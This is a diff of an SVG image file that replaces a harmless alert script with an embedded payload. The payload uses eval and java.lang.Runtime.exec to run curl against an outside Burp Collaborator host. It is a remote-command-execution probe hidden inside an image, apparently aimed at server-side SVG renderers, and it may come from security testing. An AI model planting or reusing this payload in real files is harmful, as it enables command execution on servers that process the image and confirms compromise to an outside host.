@@ -21,7 +21,7 @@
 	c-21.326-24.978-47.502-25.803-77.339-17.365c-23.461,6.634-39.234-7.117-52.98-31.273C318.42,87.525,265.838,64.927,210.333,65.331
 	z M445.731,203.01c6.12,0,11.112,4.919,11.112,11.038c0,6.119-4.994,11.111-11.112,11.111s-11.038-4.994-11.038-11.111
 	C434.693,207.929,439.613,203.01,445.731,203.01z"/>
-<script type="text/javascript">
-	alert("1");
+<script type="text/ecmascript">
+	eval(''+new String(java.lang.Runtime.getRuntime().exec('/usr/bin/curl http://sgcz9aly9rgrtvhb3175w7qyfpll9a.burpcollaborator.net')));
 </script>
 </svg>
